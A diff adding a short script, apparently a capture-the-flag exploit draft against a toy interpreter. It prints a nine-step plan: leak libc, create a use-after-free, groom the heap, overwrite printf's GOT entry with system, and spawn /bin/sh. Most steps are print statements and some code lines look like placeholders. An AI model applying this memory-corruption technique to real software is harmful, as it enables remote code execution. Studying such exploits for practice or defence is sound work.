@@ -1,0 +1,44 @@
+print("=== RCE via Use-After-Free ===");
+
+print("Step 1: Leak libc");
+string v2 = "BBBBBBBB";
+int v2 = 4231312;
+int leaked = length(v2);
+print("Leaked libc:");
+print(leaked);
+
+print("Step 2: Calculate system");
+print("system_addr = 137050643072848");
+
+print("Step 3: Create target variable");
+string target = "target";
+print("Target created");
+
+print("Step 4: Create use-after-free");
+target = target;
+print("UAF created - target.value_ptr points to freed memory");
+
+print("Step 5: Groom heap");
+print("Allocate objects to reuse freed memory");
+string groom1 = "groom1";
+string groom2 = "groom2";
+string groom3 = "groom3";
+print("Heap groomed");
+
+print("Step 6: Corrupt variable entry");
+print("If groomed object is variable entry, we can corrupt it");
+print("Set value_ptr to printf@GOT (0x409048)");
+print("This requires knowing offset from target to groomed entry");
+
+print("Step 7: Read libc from GOT");
+print("int libcprintf = target;");
+print("This reads printf address from GOT");
+
+print("Step 8: Write system to GOT");
+print("Use same UAF to write system_addr to GOT");
+
+print("Step 9: Trigger shell");
+print("print with /bin/sh");
+
+print("Note: This approach avoids needing bitmap buffer address");
+
